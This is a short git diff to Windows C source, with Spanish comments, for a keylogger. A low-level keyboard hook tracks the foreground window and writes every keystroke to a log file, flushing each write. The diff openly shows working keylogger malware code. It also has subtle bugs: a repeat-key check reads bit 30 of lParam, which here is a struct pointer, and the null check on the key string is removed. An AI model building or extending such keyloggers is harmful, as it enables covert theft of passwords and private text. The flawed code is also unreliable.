@@ -24,7 +24,13 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     // Variable estatica para recordar la ultima ventana activa (Handle to windows)
     static HWND lastHwnd = NULL;
 
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+
+        // filtro para teclas dobles
+        if ((lParam & (1 << 30)) != 0) {
+            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+        }
+
         // 1. Obtener la ventana actual
         HWND currentHnwd = GetForegroundWindow();
 
@@ -57,17 +63,16 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         // Procesar y escribir la tecla
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = p->vkCode;  // Código virtual de la tecla
+
+        // Funcion para obtener el caracter o nombre de la tecla
         char* keyChar = VirtualKeyToChar(vkCode, p->scanCode);
 
-        // Solo imprimir y registrar si KeyChar no esta vacio
-        if (keyChar && keyChar[0] != '\0') {
-            printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
+        printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
 
-            // crear archivo si no existe
-            if (logFile) {
-                fprintf(logFile, "%s", keyChar);
-                fflush(logFile); //Forzar escritura inmediata
-            }
+        // crear archivo si no existe
+        if (logFile) {
+            fprintf(logFile, "%s", keyChar);
+            fflush(logFile); //Forzar escritura inmediata
         }
 
         // Si presiona ESC, termina el programa
